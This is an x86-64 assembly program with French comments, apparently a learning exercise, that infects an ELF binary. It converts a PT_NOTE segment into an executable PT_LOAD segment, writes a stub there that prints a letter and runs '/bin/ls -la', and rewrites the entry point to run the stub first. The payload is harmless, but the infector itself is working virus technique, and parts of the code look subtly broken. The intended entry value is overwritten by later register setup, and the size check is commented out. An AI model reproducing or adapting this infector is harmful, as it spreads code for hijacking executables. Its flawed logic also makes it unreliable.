bits 64
default rel
    
section .data
    file db 'ls_la', 0    
    buffer times 512 db 0
        
    message_elf db "Il s'agit d'un fichier ELF",10,0
    length_elf equ $-message_elf
    
    message_not_elf db "Ce n'est pas un fichier elf",10,0
    length_not_elf equ $-message_not_elf
    
    error_msg db "Erreur de lecture", 10, 0
    length_error equ $-error_msg
    
    message_no_ptnote db "Segment PT_NOTE non trouvé", 10, 0
    length_no_ptnote equ $-message_no_ptnote

    message_segments_looked db "On parcours les segments pour retrouver PT_Note ", 10, 0
    length_segments_looked equ $-message_segments_looked
    
    ; On définit la taille qu'on veut donner à notre segment après modification
    NEW_SEG_SIZE equ 512
    
    ; Constantes
    PT_NOTE equ 4
    PT_LOAD equ 1
    PF_R equ 4
    PF_X equ 1

section .text
    global _start
    
; ---------------------------------------------------------------------
; Stub code qui sera injecté dans le segment note transformé en PT_LOAD
; Ce code sera exécuté en premier grâce à la modification de e_entry.
; Il :
;   - Affiche "hello world\n"
;   - Lance "/bin/ls -la"
; Puis termine.
; ---------------------------------------------------------------------

stub:
    ; write(1, msg, msg_len)
    xor rax, rax
    mov rax, 1    ; write
    mov rdi, 1    ; stdout
    lea rsi, [rel small_msg]
    mov rdx, 2
    syscall

    ; Préparer execve("/bin/ls", ["ls","-la",NULL], NULL)
    lea r10, [rel arg_ls]  ; adresse de "ls"
    lea r11, [rel arg_la]  ; adresse de "-la"
    push 0
    push r11
    push r10
    mov rsi, rsp           ; rsi = &["ls","-la",NULL]

    ; execve("/bin/ls", ["ls","-la"], NULL)
    xor rax, rax
    mov rax, 59            ; sys_execve
    lea rdi, [rel path]    ; /bin/ls
    xor rdx, rdx           ; envp = NULL
    syscall

    ; Si echec
    xor rax, rax
    mov rax, 60
    xor rdi, rdi
    syscall

small_msg: db "H",10
msg_len equ $-small_msg

path: db "/bin/ls",0
arg_ls: db "ls",0
arg_la: db "-la",0

_end_stub:

%define STUB_SIZE (_end_stub - stub)


_start:
    ; Ouvrir le fichier
    mov rax, 2               ; Appel système open
    mov rdi, file            ; Nom du fichier
    mov rsi, 2               ; Mode lecture/écriture
    mov rdx, 0               ; Pas de flag
    syscall                  ; Exécuter open
    test rax, rax
    js error_exit
    mov r9, rax             ; Stocker le descripteur de fichier

read_firstByte:
    ; Lire les premiers octets pour vérifier s'il s'agit d'un fichier ELF
    mov rax, 0               ; Appel système read
    mov rdi, r9
    mov rsi, buffer          ; Stocker les données lues dans le buffer
    mov rdx, 64              ; Lire 64 octets
    syscall                  ; Exécuter read
    test rax, rax
    js error_exit

    ; Vérifier si c'est un fichier ELF
    cmp dword [buffer], 0x464C457F   ; Comparer avec le magic number ELF
    je ELF_file

not_ELF_file:
    ; Gérer les fichiers non ELF
    mov rax, 1
    mov rdi, 1
    mov rsi, message_not_elf
    mov rdx, length_not_elf
    syscall
    jmp end

ELF_file:
    ; Afficher un message pour un fichier ELF
    mov rax, 1
    mov rdi, 1
    mov rsi, message_elf
    mov rdx, length_elf
    syscall
    
    ; Passer à l'analyse de la table des segments
    jmp Parse
          
Parse:
    mov rsi, buffer                ; Pointeur vers le buffer ELF

    ; Message pour indiquer que l'on recherche PT_note
    mov rax, 1
    mov rdi, 1
    mov rsi, message_segments_looked
    mov rdx, length_segments_looked
    syscall
    
    ; Récupérer l'offset de la table des programmes (e_phoff) et le nombre d'entrées (e_phnum)
    mov rax, [buffer+0x20]          ; e_phoff (offset de la table des programmes)
    mov r8, rax                     ; sauvegarde
    movzx rcx, word [buffer+0x36]   ; Taille d'une entrée 
    movzx rbx, word [buffer+0x38]   ; nombre de segments
    
    ; Si e_phnum = 0, pas de segments
    test rbx, rbx
    jz limit_reached
    
    ; On initialise un compteur pour parcourir les entrées de la table des programmes
    xor r12, r12
    mov r14, rcx   ; r14 = e_phentsize
    mov r15, rbx   ; r15 = e_phnum

check_segments_loop:
    ; Vérifier si nous avons atteint la fin de la table des en-têtes de programme
    cmp r12, rbx
    jge limit_reached               ; Si on a parcouru tous les segments, sortir

    ; Calculer l'offset du segment actuel dans le fichier (e_phoff + i*e_phentsize)
    mov rcx, r14
    xor rdx, rdx
    mov rax, r12    ; rdx est la taille d'un segment
    mul rcx         ; i * e_phentsize
    add rax, r8     ; e_phoff + i*e_phentsize
    mov r10, rax    ; offset
    
    ; Se positionner au bon endroit
    mov rax, 8        ; sys_lseek
    mov rdi, r9       ; fd
    mov rsi, r10      ; offset
    xor rdx, rdx      ; SEEK_SET = 0
    syscall
    test rax, rax
    js error_exit
    
    ; On lit le Program Header courant
    mov rax, 0        ; sys_read
    mov rdi, r9
    mov rsi, buffer
    mov rdx, r14       ; taille du Program Header
    syscall
    test rax, rax
    js error_exit

    ; Vérifier si p_type (4 premiers octets du PH) == PT_NOTE
    cmp dword [buffer], PT_NOTE
    je found_pt_note

    ; Si pas trouvé, on passe au suivant
    inc r12
    jmp check_segments_loop
    
; On a un PT_NOTE. On va le transformer.
found_pt_note: 
    ; On a PT_NOTE
    ; On suppose STUB_SIZE <= p_filesz original du PT_NOTE pour éviter la corruption.
    ; Si ce n'est pas le cas, il faut arrêter.
    ; Vérif p_filesz
    ;mov rax,[buffer+0x20] ; p_filesz
    ;cmp rax,STUB_SIZE
    ;jb error_exit ; stub trop grand, on ne veut pas corrompre
    
    ; Modifier en PT_LOAD
    mov dword [buffer], PT_LOAD
    
    ; p_flags = R|X
    mov dword [buffer+0x04], PF_R|PF_X
    
    ; mov [buffer+0x20], STUB_SIZE
    ; mov [buffer+0x28], STUB_SIZE

    ; Réécriture PH
    mov rax, 8
    mov rdi, r9
    mov rsi, r10
    xor rdx, rdx
    syscall
    test rax, rax
    js error_exit

    mov rax, 1
    mov rdi, r9
    mov rsi, buffer
    mov rdx, r14
    syscall
    test rax, rax
    js error_exit
    
    ; Maintenant, on écrit le stub au même endroit que le segment note
    mov rax,[buffer+0x08] ; p_offset
    mov r11, rax

    ; Mettre le curseur au nouveau p_offset
    mov rax, 8
    mov rdi, r9
    mov rsi, r11
    xor rdx, rdx
    syscall
    test rax, rax
    js error_exit

    ; Ecrire le stub
    mov rax, 1
    mov rdi, r9
    mov rsi, stub
    mov rdx, STUB_SIZE
    syscall
    test rax, rax
    js error_exit

    ; Modifier e_entry pour pointer sur p_vaddr du PT_NOTE original
    mov rax,[buffer+0x10]
    mov rsi, rax ; p_vaddr
    
    ; Revenir en début de fichier pour réécrire le header
    mov rax, 8
    mov rdi, r9
    xor rsi, rsi
    xor rdx, rdx
    syscall
    test rax, rax
    js error_exit

    mov rax, 0
    mov rdi, r9
    mov rsi, buffer
    mov rdx, 64
    syscall
    test rax, rax
    js error_exit

    mov [buffer+0x18], rsi  ; e_entry = p_vaddr
    ; Réécrire ELF header
    mov rax, 8
    mov rdi, r9
    xor rsi, rsi
    xor rdx, rdx
    syscall
    test rax, rax
    js error_exit

    mov rax, 1
    mov rdi, r9
    mov rsi, buffer
    mov rdx, 64
    syscall
    test rax, rax
    js error_exit

    ; On termine le code
    jmp end

limit_reached:
    ; Si on a parcouru tous les segments et qu'on n'a pas trouvé PT_NOTE
    mov rax, 1
    mov rdi, 1
    mov rsi, message_no_ptnote
    mov rdx, length_no_ptnote
    syscall

    jmp end

error_exit:
    ; Afficher un message d'erreur
    mov rax, 1
    mov rdi, 1
    mov rsi, error_msg
    mov rdx, length_error
    syscall

end:
    ; Sortir du programme
    mov rax, 60 
    xor rdi, rdi                
    syscall
